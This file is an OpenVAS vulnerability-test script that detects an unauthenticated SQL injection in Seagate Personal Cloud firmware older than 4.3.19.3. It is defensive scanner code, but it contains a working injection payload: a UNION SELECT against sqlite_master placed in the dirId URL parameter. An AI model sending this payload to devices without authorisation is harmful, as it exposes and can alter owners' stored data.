###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_seagate_personalcloud_sql_inj_vuln.nasl 12175 2018-10-31 06:20:00Z ckuersteiner $
#
# Seagate Personal Cloud < 4.3.19.3 SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141391");
  script_version("$Revision: 12175 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-31 07:20:00 +0100 (Wed, 31 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-08-23 15:55:34 +0700 (Thu, 23 Aug 2018)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Seagate Personal Cloud < 4.3.19.3 SQL Injection Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_nas_detect.nasl");
  script_mandatory_keys("seagate_nas/detected");

  script_tag(name:"summary", value:"Seagate Media Server in Seagate Personal Cloud has unauthenticated SQL
Injection vulnerability which may lead to retrieve or modify arbitrary data in the database.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Seagate Media Server in Seagate Personal Cloud prior to version 4.3.19.3.");

  script_tag(name:"solution", value:"Update to firmware version 4.3.19.3 or later.");

  script_xref(name:"URL", value:"https://sumofpwn.nl/advisory/2017/seagate-media-server-multiple-sql-injection-vulnerabilities.html");
  script_xref(name:"URL", value:"http://knowledge.seagate.com/articles/en_US/FAQ/007752en");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

cpe_list = make_list("cpe:/h:seagate:personal_cloud", "cpe:/h:seagate:personal_cloud_2_bay");
if (!infos = get_all_app_ports_from_list(cpe_list: cpe_list))
  exit(0);

cpe = infos['cpe'];
port = infos['port'];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

url = "/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\'+union+select+null,name,null,sql,null,null" +
      "+from+sqlite_master+--+'";

if (http_vuln_check(port: port, url: url, pattern: '"thumbUrl"', check_header: TRUE,
                    extra_check: '"parentdirId"')) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
